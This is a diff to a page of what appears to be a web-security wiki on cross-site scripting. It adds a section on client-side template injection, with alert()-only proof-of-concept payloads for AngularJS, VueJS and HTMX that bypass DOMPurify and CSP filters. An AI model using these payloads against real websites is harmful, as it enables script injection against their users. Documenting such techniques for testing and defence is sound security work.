@@ -411,9 +411,13 @@ When placing common XSS payloads in the triggers above, it becomes clear that th
 **Source code** for script used to generate and **test** the results in the table above
 {% endfile %}
 
-### AngularJS Template Injection
+### Client-Side Template Injection
 
-[AngularJS](https://angularjs.org/) is a common web framework for the frontend. It allows easy interactivity by adding special attributes and syntax that it recognizes and executes. This also exposes some new ways for HTML/Text injections to execute arbitrary JavaScript if regular ways are blocked. One caveat is that all these injections need to happen inside an element with an `ng-app` attribute to enable this feature.&#x20;
+Templating frameworks help fill out HTML with user data and try to make interaction easier. While this often helps with auto-escaping special characters, it can hurt in some other ways when the templating language itself can be injected without HTML tags, or using normally safe HTML that isn't sanitized.
+
+#### [AngularJS](https://docs.angularjs.org/guide/templates)
+
+AngularJS is a common web framework for the frontend. It allows easy interactivity by adding special attributes and syntax that it recognizes and executes. This also exposes some new ways for HTML/Text injections to execute arbitrary JavaScript if regular ways are blocked. One caveat is that all these injections need to happen inside an element with an `ng-app` attribute to enable this feature.&#x20;
 
 When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.&#x20;
 
@@ -454,6 +458,44 @@ Here are a few examples of how it can be abused on the latest version. All alert
 
 You may still be able to exploit this though, by slowing down the AngularJS script loading by **filling up the browser's connection pool**. [See this challenge writeup for details](https://blog.ryotak.net/post/dom-based-race-condition/).
 {% endhint %}
+
+#### [VueJS](https://vuejs.org/guide/essentials/template-syntax.html)
+
+{% code title="Working Demo" %}
+```html
+<script src="https://cdn.jsdelivr.net/npm/vue@2.5.13/dist/vue.js"></script>
+
+<div id="app">
+  <p>{{this.constructor.constructor('alert(1)')()}}</p>
+  <p>{{this.$el.ownerDocument.defaultView.alert(2)}}</p>
+</div>
+<script>
+  new Vue({
+    el: "#app",
+  });
+</script>
+```
+{% endcode %}
+
+{% embed url="https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets" %}
+Incredibly detailed research into VueJS payloads and filter bypasses
+{% endembed %}
+
+#### [HTMX](https://htmx.org/docs/)
+
+<pre class="language-html"><code class="lang-html">&#x3C;script src="https://unpkg.com/htmx.org@1.9.12">&#x3C;/script>
+
+<strong>&#x3C;!-- Old syntax, simple eval -->
+</strong>&#x3C;img src="x" hx-on="error:alert(1)" />
+<strong>&#x3C;!-- Normally impossible elements allow injecting JavaScript into eval'ed function! -->
+</strong>&#x3C;meta hx-trigger="x[1)}),alert(2);//]" />
+&#x3C;div hx-disable>
+<strong>  &#x3C;!-- Inside hx-disable, new syntax still works -->
+</strong>  &#x3C;img src="x" hx-on:error="alert(3)" />
+<strong>  &#x3C;!-- Everything can be prefixed with data-, bypassing DOMPurify! -->
+</strong>  &#x3C;img src="x" data-hx-on:error="alert(4)" />
+&#x3C;/div>
+</code></pre>
 
 ## Exploitation
 
@@ -761,7 +803,7 @@ Loading any of these blocks in a CSP that allows it, will trigger the `alert(doc
 
 See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.&#x20;
 
-See [#angularjs-template-injection](cross-site-scripting-xss.md#angularjs-template-injection "mention") for more complex AngularJS injections that bypass filters.
+See [#angularjs](cross-site-scripting-xss.md#angularjs "mention") for more complex AngularJS injections that bypass filters. Also, note that other frameworks such as [#vuejs](cross-site-scripting-xss.md#vuejs "mention") or [#htmx](cross-site-scripting-xss.md#htmx "mention") may allow similar bypasses if they are accessible when `unsafe-eval` is set in the CSP.
 
 ### Filter Bypasses
 
